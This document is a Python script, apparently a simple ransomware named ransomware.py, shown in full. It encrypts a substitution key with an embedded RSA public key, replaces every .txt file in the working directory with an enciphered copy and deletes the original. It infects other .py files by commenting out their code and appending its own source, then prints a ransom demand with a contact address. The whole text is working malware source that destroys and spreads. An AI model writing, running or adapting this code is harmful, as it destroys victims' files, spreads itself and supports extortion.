import os
import string
import subprocess
from Crypto.Random.random import shuffle
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

infected_list = ["ransomware.py", "file-recovery.py", "key-recovery.py", "keygen.py"]

def public_key():
    if os.path.isfile('public.pem'):
        return open('public.pem', 'rb').read()
    else:
        pub_key = "-----BEGIN PUBLIC KEY-----" + '\n'
        pub_key += "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAl0hK+PnB1JLFkbAr0ix8" + '\n'
        pub_key += "9wEgDUFs35UNKSA6pIwZDfc46m1dwxb56rTa3vPj/y586kmmb03so6YrX7oWPiJ1" + '\n'
        pub_key += "jAuMoBFzuScuMA4H1V2jCxilUO699JMq2Ve9Raxsi8TfoeCzCkxZFW5m2wXZEs0r" + '\n'
        pub_key += "XjKT8nQ8asvZnVruR8XZNWOfGlhJqtp6V37eff3PnmN0Dw31KzG+EXOEtB6nUITq" + '\n'
        pub_key += "eNM8NFPBRWYRj7oSZel08LBzCj6ZikpBsbLwYQoQyXidpCIWdMO9oaCQXB7z3aMB" + '\n'
        pub_key += "2Jz2LsmKNPOd+tZNUsjimDABZxjz9BbLH4IS7X52nqRVGWw1Zzdqzp/pzg7xJQdD"
        pub_key += "7wIDAQAB" + '\n'
        pub_key += "-----END PUBLIC KEY-----"
    return pub_key


def encrypt(substitute):
    letter = string.ascii_letters + string.ascii_uppercase
    encryptor = PKCS1_OAEP.new(RSA.import_key(public_key()))
    with open("key.bin", "wb") as f:
        f.write(encryptor.encrypt(''.join(str(x) for x in substitute).encode()))
    for file in os.listdir():
        lines = list()
        if file.endswith(".txt"):
            with open(file, "r") as f:
                for line in f:
                    lines.append(line)
            with open(file[:-4] + ".enc", "w") as enc:
                for line in lines:
                    for char in line:
                        if char in letter:
                            enc.write(substitute[letter.index(char)])
                        else:
                            enc.write(char)
            os.remove(file)
        if file.endswith(".py") and file not in infected_list:
            with open(file, "r+") as f, open("ransomware.py", "r" ) as r:
                for line in f:
                    lines.append('#' + line)
                lines.append("\n")
                for line in r:
                    if line.startswith("infected_list"):
                        infected_list.append(file)
                        line = "infected_list = " + str(infected_list) + "\n"
                    lines.append(line)
                f.seek(0)
                for line in lines:
                    f.write(line)
                f.truncate()
            subprocess.run(["chmod", "+x", file])
    print("Your text files are encrypted. To decrypt them, you need to pay me money and send key.bin in your folder to emailer@email.com")


def main():
    alphabets = list(string.ascii_lowercase + string.ascii_uppercase)
    shuffle(alphabets)
    encrypt(alphabets)


if __name__ == "__main__":
    main()
